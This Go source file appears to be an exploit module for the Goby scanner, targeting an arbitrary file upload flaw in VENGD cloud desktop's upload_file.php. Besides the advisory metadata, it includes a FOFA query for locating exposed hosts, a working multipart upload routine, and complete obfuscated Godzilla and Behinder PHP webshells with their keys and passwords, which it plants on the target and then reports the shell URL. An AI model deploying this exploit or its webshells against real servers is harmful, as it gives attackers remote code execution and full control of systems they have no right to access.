package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "VENGD upload_file.php file upload vulnerability",
    "Description": "<p>VENGD is the leading domestic desktop virtualization product based on NGD architecture. It integrates the three major architectural advantages of VDI, VOI, and IDV to realize front-end and back-end hybrid computing. It can fully utilize front-end resources while scheduling server back-end computing resources. Hexin's next-generation cloud desktop can not only meet the needs of mobile office anytime and anywhere, but also achieve full compatibility with 3D high-definition playback and peripheral hardware in a narrow-band environment, meeting the management, security, and operation and maintenance needs of large-scale terminals.</p><p>VENGD has an arbitrary file upload vulnerability. An attacker can use this vulnerability to write files, upload malicious files to the server, and obtain server permissions, causing the entire device or server to be controlled.</p>",
    "Product": "And-Letter-Next-Generation-Cloud-Desktop-VENGD",
    "Homepage": "https://www.vesystem.com/",
    "DisclosureDate": "2023-12-13",
    "PostTime": "2023-12-13",
    "Author": "r4v3zn",
    "FofaQuery": "title=\"和信下一代云桌面VENGD\" || body=\"和信下一代云桌面\"",
    "GobyQuery": "title=\"和信下一代云桌面VENGD\" || body=\"和信下一代云桌面\"",
    "Level": "3",
    "Impact": "<p>VENGD has an arbitrary file upload vulnerability. An attacker can use this vulnerability to write files, upload malicious files to the server, and obtain server permissions, causing the entire device or server to be controlled.</p>",
    "Recommendation": "<p>1. Please contact the corresponding manufacturer to fix the vulnerability.</p><p>2. If not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "godzilla,behinder,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "check1234X.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\"; ?>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "VENGD upload_file.php 文件上传漏洞",
            "Product": "和信下一代云桌面VENGD",
            "Description": "<p>VENGD 是国内领先的基于 NGD 架构的桌面虚拟化产品，它融合了VDI、VOI、IDV三大架构优势，实现了前后端混合计算，在调度服务器后端计算资源的同时更能充分利用前端资源，和信下一代云桌面不仅可以满足随时随地移动办公的需求，更可以在窄带环境下实现3D高清播放和外设硬件的全面兼容，满足大规模终端的管理、安全、运维需求。</p><p>VENGD 存在任意文件上传漏洞攻击者可利用该漏洞写入文件，上传恶意文件到服务器，获取服务器权限，导致整个设备或服务器被控制。</p>",
            "Recommendation": "<p>1、请用户联系对应厂商修复漏洞。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>VENGD 存在任意文件上传漏洞攻击者可利用该漏洞写入文件，上传恶意文件到服务器，获取服务器权限，导致整个设备或服务器被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "VENGD upload_file.php file upload vulnerability",
            "Product": "And-Letter-Next-Generation-Cloud-Desktop-VENGD",
            "Description": "<p>VENGD is the leading domestic desktop virtualization product based on NGD architecture. It integrates the three major architectural advantages of VDI, VOI, and IDV to realize front-end and back-end hybrid computing. It can fully utilize front-end resources while scheduling server back-end computing resources. Hexin's next-generation cloud desktop can not only meet the needs of mobile office anytime and anywhere, but also achieve full compatibility with 3D high-definition playback and peripheral hardware in a narrow-band environment, meeting the management, security, and operation and maintenance needs of large-scale terminals.</p><p>VENGD has an arbitrary file upload vulnerability. An attacker can use this vulnerability to write files, upload malicious files to the server, and obtain server permissions, causing the entire device or server to be controlled.</p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">1. Please contact the corresponding manufacturer to fix the vulnerability.</span><br></p><p>2. If not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>VENGD has an arbitrary file upload vulnerability. An attacker can use this vulnerability to write files, upload malicious files to the server, and obtain server permissions, causing the entire device or server to be controlled.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10180"
}`

	uploadFlag7IYQDu := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		folder := goutils.RandomHexString(5)
		uploadRequestConfig := httpclient.NewPostRequestConfig("/Upload/upload_file.php?l=" + folder)
		uploadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv")
		uploadRequestConfig.Data = "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\nContent-Type: image/avif\n\n" + content + "\n------WebKitFormBoundaryfcKRltGv--"
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if resp == nil && err != nil {
			return nil, err
		}
		checkRequestConfig := httpclient.NewGetRequestConfig("/Upload/" + folder + "/" + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(16) + ".php"
			resp, _ := uploadFlag7IYQDu(hostInfo, filename, `<?php @error_reporting(0);echo "`+checkStr+`";unlink(__FILE__);?>`)
			return resp != nil && strings.Contains(resp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var content string
			filename := goutils.RandomHexString(6) + ".php"
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "godzilla" {
				content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}echo "e165421110ba03099a1c0393373c5b43";?>`
			} else if attackType == "behinder" {
				content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);echo "e165421110ba03099a1c0393373c5b43";?>`
			} else if attackType == "custom" {
				filename = goutils.B2S(ss.Params["filename"])
				content = goutils.B2S(ss.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := uploadFlag7IYQDu(expResult.HostInfo, filename, content)
			if resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path + "\n"
				if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else if attackType == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				}
				expResult.Output += "Webshell type: php\n"
				expResult.Success = true
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
